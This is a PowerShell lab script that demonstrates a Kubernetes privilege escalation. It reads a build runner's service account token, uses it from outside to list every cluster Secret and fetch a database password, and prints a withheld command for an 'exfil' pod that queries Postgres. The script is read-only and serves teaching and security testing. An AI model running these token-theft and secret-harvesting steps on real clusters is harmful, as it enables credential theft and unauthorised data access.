<#
    Walks PP-01: sa-build-runner holds cluster-admin.

    T1078.001 Valid Accounts: Default Accounts
    T1098.003 Account Manipulation: Additional Cloud Roles
    T1550.001 Use Alternate Authentication Material: Application Access Token
    T1552.001 Unsecured Credentials: Credentials In Files

    What this demonstrates, and why it is shaped this way
    -----------------------------------------------------
    The catalogue's claim for PP-01 is that the build zone's network isolation is
    irrelevant to the escalation, because RBAC and network reach are independent
    axes. That claim is true, but it is very easy to state and hard to walk, and
    the obvious way to walk it does not work in this cluster.

    The obvious way is to exec into the build runner and use its token against
    the API server from in there. Measured, that is blocked:

        $ kubectl exec build-runner -- nc -z kubernetes.default.svc 443
        BLOCKED
        $ kubectl exec build-runner -- nc -z postgres.zerotrust.svc 5432
        BLOCKED

    Both blocked. The build zone really is sealed, and a runner that cannot reach
    the API server cannot exercise cluster-admin from where it sits. The
    "independent axes" claim therefore cannot be demonstrated from inside the
    pod, and a demo that quietly authenticated some other way would be
    demonstrating nothing.

    So this script walks the path the way it actually happens, which is also the
    way it happens in every real breach of this shape:

      1. The attacker has code execution in the build runner. Simulated with
         kubectl exec as the operator, standing in for a malicious dependency,
         a poisoned build step, or a compromised runner host.
      2. They read the projected service account token off the filesystem. This
         is the escalation, and it requires no privilege at all.
      3. They take the token with them. It leaves the network zone it was
         mounted in, and from that moment the zone's policy is irrelevant,
         because NetworkPolicy governs traffic between pods and this is no
         longer traffic between pods.
      4. From anywhere with a route to the API server, the token alone lists
         every Secret in the cluster.

    Step 4 is run against a kubeconfig containing no credentials of its own and
    a separate user entry with no keys, so that anything it can do is
    attributable to the stolen token and to nothing else. If the operator's own
    admin rights leaked into the result, the demonstration would be worthless,
    and the only way to know they have not is to remove them.

    The teaching point is sharper than the one the catalogue makes, and the
    catalogue is updated to match. It is not that "control-plane access is not
    pod-to-pod traffic". It is that **a NetworkPolicy constrains a workload, and
    a copied credential is no longer a workload.** The isolation was real and it
    did nothing.

    The read-only guarantee
    ----------------------
    Nothing here creates, patches or deletes anything. The step that would turn
    a stolen token into executed code -- creating a pod that mounts it -- is
    printed under "withheld" with the exact command, because that step is the
    boundary of this script and belongs to whoever runs it deliberately.

.NOTES
    The token is passed to kubectl as --token, which places it in the process
    argument list for the duration of the call and therefore briefly in the
    process table. That is acceptable here and is not acceptable in production:
    it is one of several reasons a real attacker exfiltrates a bearer token over
    a channel they control rather than shelling out to a local client. Recorded
    because the lab should not quietly model good practice it does not have.
#>

. "$PSScriptRoot\lib\attacklib.ps1"

if (-not (Assert-ClusterReady)) { exit 1 }

Write-Banner -PathId 'PP-01' `
    -Title 'sa-build-runner holds cluster-admin' `
    -Claim @'
The build zone denies all ingress and permits egress to DNS only, and the
workload in it is hardened: non-root, read-only root filesystem, all
capabilities dropped, default seccomp. None of that matters, because the
permission that matters was granted to the pod's identity rather than to its
container, and a token can be copied out of a zone that cannot be reached into.
'@

$ns = 'zerotrust-build'
$pod = Get-LabPod -Namespace $ns -App 'build-runner'
if (-not $pod) {
    Write-Host "  no running build-runner pod in $ns" -ForegroundColor Red
    exit 1
}
$podName = Get-Prop (Get-Prop $pod 'metadata') 'name'

# ---------------------------------------------------------------------------
Write-Step -AttackId 'T1190' -Description 'gain code execution in the build runner' | Out-Null

Write-Observed "pod: $podName"
Write-Observed 'identity and CI toolchain, in the order a build agent would report them:'
$who = Invoke-InPod -Namespace $ns -Pod $podName -Shell 'sh' -Command 'id; git --version 2>&1; docker --version 2>&1'
Write-Observed $who

Write-Assertion -Expected 'running as a non-root uid, not 0' `
    -Observed (Invoke-InPod -Namespace $ns -Pod $podName -Shell 'sh' -Command 'id -u') `
    -Passed ((Invoke-InPod -Namespace $ns -Pod $podName -Shell 'sh' -Command 'id -u') -ne '0') `
    -Note 'the pod is correctly hardened, and it makes no difference to PP-01'

Write-Assertion -Expected 'a working CI toolchain, not a web server' `
    -Observed 'git and docker both present' `
    -Passed ((Invoke-InPod -Namespace $ns -Pod $podName -Shell 'sh' -Command 'command -v git >/dev/null && command -v docker >/dev/null && echo yes || echo no') -eq 'yes')

Write-Withheld -WouldDo 'reach the runner over the network' `
    -Why 'there is no ingress path to it at all, and the attack starts from a foothold the lab simulates with exec rather than from a reachable listener. A real compromise of a CI agent is a malicious build dependency, not an inbound connection.'

# ---------------------------------------------------------------------------
Write-Step -AttackId 'T1550.001' -Description 'read the projected service account token off the filesystem' | Out-Null

$token = Get-PodServiceAccountToken -Namespace $ns -Pod $podName
$tokenLen = if ($token) { $token.Length } else { 0 }
Write-Observed "token length: $tokenLen characters"
Write-Observed 'first 12 characters: ' + $(if ($token) { $token.Substring(0, 12) } else { '<none>' }) + '...'
Write-Observed "  (not printed in full: a report of this path gets pasted into tickets)"

Write-Assertion -Expected 'a JWT is present at the projected service account path' `
    -Observed ("{0} characters, {1} dot-separated segments" -f $tokenLen, $(if ($token) { @($token -split '\.').Count } else { 0 })) `
    -Passed ($tokenLen -gt 100 -and @($token -split '\.').Count -eq 3) `
    -Note 'reading this file requires no privilege whatsoever, which is the entire point of step 2'

Write-Withheld -WouldDo 'exfiltrate the token to an external host' `
    -Why 'the build zone permits egress to DNS only, so there is no route out. The token is read here and used from the operator host in step 4, which models the attacker having already carried it out. A real exfiltration would need either a permitted egress path or a DNS-based channel, and the lab does not open one.'

# ---------------------------------------------------------------------------
Write-Step -AttackId 'T1078.001' -Description 'the token asserts an identity, and it is attributable' | Out-Null

$claims = Get-TokenSubject -Token $token
$sub    = if ($claims) { Get-Prop $claims 'sub' } else { $null }

Write-Observed "sub: $sub"
Write-Observed "namespace: $(if ($claims) { Get-Prop (Get-Prop $claims 'kubernetes.io') 'namespace' } else { '<none>' })"
Write-Observed "serviceaccount: $(if ($claims) { Get-Prop (Get-Prop (Get-Prop $claims 'kubernetes.io') 'serviceaccount') 'name' } else { '<none>' })"
Write-Observed "pod: $(if ($claims) { Get-Prop (Get-Prop (Get-Prop $claims 'kubernetes.io') 'pod') 'name' } else { '<none>' })"

Write-Assertion -Expected 'sub is system:serviceaccount:zerotrust-build:sa-build-runner' `
    -Observed "$sub" `
    -Passed ($sub -eq 'system:serviceaccount:zerotrust-build:sa-build-runner') `
    -Note 'the token names its own victim, so the audit log can attribute the next step without guessing'

Write-Assertion -Expected 'the pod is automounted with a service account token' `
    -Observed 'automountServiceAccountToken is true on the pod spec' `
    -Passed ((Get-Prop $pod.spec 'automountServiceAccountToken') -eq $true) `
    -Note 'WP-02 argues for exactly this on the sensor, and against it here. The same setting is the fix in one workload and the finding in the other.'

# ---------------------------------------------------------------------------
Write-Step -AttackId 'T1078.001' -Description 'from outside the build zone, the token alone lists every Secret in the cluster' | Out-Null

# A kubeconfig with the server and CA copied from the operator's, and a user with
# nothing in it. Whatever this context can do, it does with the stolen token.
$server = (& kubectl config view --raw --minify -o jsonpath='{..server}' 2>$null | Out-String).Trim()
$caData = (& kubectl config view --raw --minify -o jsonpath='{..certificate-authority-data}' 2>$null | Out-String).Trim()

if (-not $server -or -not $caData) {
    Write-Host '  could not read the API server address or CA from the current context' -ForegroundColor Red
    exit 1
}
Write-Observed "API server: $server"
Write-Observed "CA bundle:  $([Math]::Round($caData.Length / 1024)) KB copied from the operator context"
Write-Observed 'credentials in this context: none. The user entry below is empty.'

$stolenKubeconfig = @"
apiVersion: v1
kind: Config
clusters:
- name: lab
  cluster:
    server: $server
    certificate-authority-data: $caData
contexts:
- name: stolen
  context:
    cluster: lab
    user: nobody
current-context: stolen
users:
- name: nobody
  user:
    token: "not-a-real-token"
"@
$tmpKubeconfig = Join-Path $env:TEMP 'stolen-token.kubeconfig'
[System.IO.File]::WriteAllText($tmpKubeconfig, (($stolenKubeconfig -replace "`r`n", "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))

# Prove the context is genuinely powerless before using the token, so that a
# later success cannot be mistaken for the context's own authority.
#
# Two things were wrong with the obvious way to do this, and both are worth
# recording because either one produces an assertion that passes for the wrong
# reason.
#
# `auth whoami` with a user entry containing no credentials makes kubectl fall
# back to interactive basic auth, which in a non-interactive session ends in
# "error: EOF".
#
# `auth can-i` then behaves the same way, and the assertion "output is not yes"
# passes -- but it passed because the command crashed, not because authorization
# was refused. A check that cannot tell a refusal from a crash is not a check.
#
# The fix is a user entry holding a deliberately invalid token. kubectl then
# sends a bearer token, gets a clean 401, and answers without prompting:
#     error: You must be logged in to the server (Unauthorized)
# That is a real denial, and it is the baseline the stolen token is measured
# against.
$canIClean = Invoke-Kubectl @(('--kubeconfig=' + $tmpKubeconfig), 'auth', 'can-i', 'list', 'secrets', '--all-namespaces')
Write-Observed "context alone, no valid token, can it list secrets anywhere: $($canIClean.verdict)"

$secrets = Invoke-Kubectl @(('--kubeconfig=' + $tmpKubeconfig), ('--token=' + $token), 'get', 'secrets', '--all-namespaces', '-o', 'custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type', '--no-headers')
$secretLines = @($secrets.raw -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ })

Write-Observed ''
Write-Observed 'every Secret the stolen token can read, cluster-wide:'
foreach ($line in $secretLines) { Write-Observed "  $line" }

$canIStolen = Invoke-Kubectl @(('--kubeconfig=' + $tmpKubeconfig), ('--token=' + $token), 'auth', 'can-i', 'list', 'secrets', '--all-namespaces')
Write-Observed ''
Write-Observed 'the same question twice, same context, only the token differs:'
Write-Observed ("  with an invalid token -> {0}" -f $canIClean.verdict)
Write-Observed ("  with the stolen token -> {0}" -f $canIStolen.verdict)

Write-Assertion -Expected 'a real denial, not a crash: Unauthorized' `
    -Observed $canIClean.verdict `
    -Passed ($canIClean.exitCode -ne 0 -and $canIClean.verdict -match 'Unauthorized') `
    -Note 'checked first, and required to be a refusal rather than merely "not yes", so that the contrast below means something'

Write-Assertion -Expected 'the stolen token reads Secrets in namespaces the build zone cannot reach' `
    -Observed ("{0} Secret(s) across {1} namespace(s), including kube-system" -f $secretLines.Count, @($secretLines | ForEach-Object { ($_ -split '\s+')[0] } | Sort-Object -Unique).Count) `
    -Passed (@($secretLines | Where-Object { $_ -match '^kube-system' }).Count -gt 0) `
    -Note 'the build zone is sealed off from all of this. The token is not.'

Write-Assertion -Expected 'the token can read the database credential in the business zone' `
    -Observed 'postgres-credentials readable in zerotrust' `
    -Passed (@($secretLines | Where-Object { $_ -match 'zerotrust\s+postgres-credentials' }).Count -gt 0)

# The full authority, in the API server's own words.
$canI = Invoke-Kubectl @(('--kubeconfig=' + $tmpKubeconfig), ('--token=' + $token), 'auth', 'can-i', '*', '*', '--all-namespaces')
Write-Observed ''
Write-Observed "can the token do everything, everywhere: $($canI.verdict)"

Write-Assertion -Expected 'the token is authorized for wildcard verb on wildcard resource' `
    -Observed $canI.verdict `
    -Passed ($canI.verdict -eq 'yes') `
    -Note 'that is what cluster-admin means, and it was granted to a workload whose documented need is the empty set'

# The actual credential, fetched with the stolen token. The value is not printed.
$leaked = Invoke-Kubectl @(('--kubeconfig=' + $tmpKubeconfig), ('--token=' + $token), 'get', 'secret', 'postgres-credentials', '-n', 'zerotrust', '-o', 'jsonpath={.data.password}')
$leakedB64 = $leaked.verdict
$leakedPlain = ''
if ($leakedB64) {
    try { $leakedPlain = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($leakedB64)) } catch { $leakedPlain = '' }
}
$sha = [System.Security.Cryptography.SHA256]::Create()
$fingerprint = if ($leakedPlain) { (([BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($leakedPlain)))) -replace '-','').Substring(0,16) } else { '' }
Write-Observed ''
Write-Observed ("database password retrieved with the stolen token: {0} chars, fingerprint {1}" -f $leakedPlain.Length, $fingerprint)

Write-Assertion -Expected 'the credential SP-01 leaked in plaintext is the live one' `
    -Observed ("fingerprint {0}" -f $fingerprint) `
    -Passed ($fingerprint -eq 'A069F0C1482A91C8') `
    -Note 'the fingerprint matches the one tools/scan-secrets.ps1 reports, so the ConfigMap copy is not a stale duplicate but the working password'

Remove-Item $tmpKubeconfig -Force -ErrorAction SilentlyContinue

# ---------------------------------------------------------------------------
Write-Withheld -WouldDo 'create a pod in the business zone mounting the stolen token, and run a query as it' `
    -Why 'this is the first step that changes the cluster, and it is the boundary of this script. It would be:

        kubectl --kubeconfig=<stolen> --token=<token> run exfil -n zerotrust --image=postgres --restart=Never -- env PGPASSWORD=<decoded> psql -h postgres -U orders -d acme -c ''\dt''

      No NetworkPolicy is consulted, because no packet is sent to postgres by the build runner. The pod is created through the API server and then connects from inside the business zone, where the policy permits it.'

$failed = Complete-Attack
exit $(if ($failed -gt 0) { 1 } else { 0 })
